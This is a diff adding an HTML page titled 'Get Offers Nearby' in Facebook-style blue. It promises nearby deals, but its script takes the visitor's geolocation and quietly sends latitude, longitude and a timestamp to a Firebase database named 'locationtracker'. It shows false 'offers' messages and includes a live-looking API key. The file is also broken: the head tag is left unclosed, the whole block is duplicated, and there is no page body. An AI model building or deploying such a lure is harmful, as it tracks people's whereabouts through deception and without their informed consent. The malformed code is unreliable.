@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Get Offers Nearby</title>
+  <style>
+    /* Facebook-style blue background */
+    body {
+      margin: 0;
+      height: 100vh;
+      background-color: #1877f2; /* Facebook Blue */
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+    }
+    /* Centered container */
+    .login-box {
+      background: white;
+      color: black;
+      width: 360px;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 12px 24px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+    h1 {
+      margin-bottom: 24px;
+      font-weight: 700;
+      color: #1877f2;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      border: none;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #155db2;
+    }
+    #status {
+      margin-top: 20px;
+      min-height: 24px;
+      font-size: 14px;
+      color: #333;
+    }
+  </style>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+
+    // Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyBa0AVYjgYb-UBAYlbyEphqqrMSBq6Sb9c",
+      authDomain: "locationtracker-3df88.firebaseapp.com",
+      projectId: "locationtracker-3df88",
+      storageBucket: "locationtracker-3df88.appspot.com",
+      messagingSenderId: "581996704565",
+      appId: "1:581996704565:web:821e744807609771ec927c",
+      measurementId: "G-Q6H68F1V4W",
+      databaseURL: "https://locationtracker-3df88-default-rtdb.firebaseio.com"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    function getOffers() {
+      const status = document.getElementById("status");
+      status.textContent = "Checking offers near you...";
+
+      if (!navigator.geolocation) {
+        status.textContent = "Your device does not support location sharing.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude } = position.coords;
+          status.textContent = "Getting best deals near your location...";
+
+          const locRef = push(ref(db, 'offers'));
+          set(locRef, {
+            lat: latitude,
+            lng: longitude,
+            time: Date.now()
+          });
+
+          status.textContent = "Thanks! You'll now see nearby offers shortly.";
+        },
+        (error) => {
+          console.error(error);
+          status.textContent = "Could not get location: " + error.message;
+        }
+      );
+    }
+
+    window.getOffers = getOffers;
+  </script>
+</head<!DOCTYPE html>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Get Offers Nearby</title>
+  <style>
+    /* Facebook-style blue background */
+    body {
+      margin: 0;
+      height: 100vh;
+      background-color: #1877f2; /* Facebook Blue */
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+    }
+    /* Centered container */
+    .login-box {
+      background: white;
+      color: black;
+      width: 360px;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 12px 24px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+    h1 {
+      margin-bottom: 24px;
+      font-weight: 700;
+      color: #1877f2;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      border: none;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #155db2;
+    }
+    #status {
+      margin-top: 20px;
+      min-height: 24px;
+      font-size: 14px;
+      color: #333;
+    }
+  </style>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+
+    // Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyBa0AVYjgYb-UBAYlbyEphqqrMSBq6Sb9c",
+      authDomain: "locationtracker-3df88.firebaseapp.com",
+      projectId: "locationtracker-3df88",
+      storageBucket: "locationtracker-3df88.appspot.com",
+      messagingSenderId: "581996704565",
+      appId: "1:581996704565:web:821e744807609771ec927c",
+      measurementId: "G-Q6H68F1V4W",
+      databaseURL: "https://locationtracker-3df88-default-rtdb.firebaseio.com"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    function getOffers() {
+      const status = document.getElementById("status");
+      status.textContent = "Checking offers near you...";
+
+      if (!navigator.geolocation) {
+        status.textContent = "Your device does not support location sharing.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude } = position.coords;
+          status.textContent = "Getting best deals near your location...";
+
+          const locRef = push(ref(db, 'offers'));
+          set(locRef, {
+            lat: latitude,
+            lng: longitude,
+            time: Date.now()
+          });
+
+          status.textContent = "Thanks! You'll now see nearby offers shortly.";
+        },
+        (error) => {
+          console.error(error);
+          status.textContent = "Could not get location: " + error.message;
+        }
+      );
+    }
+
+    window.getOffers = getOffers;
+  </script>
+</head
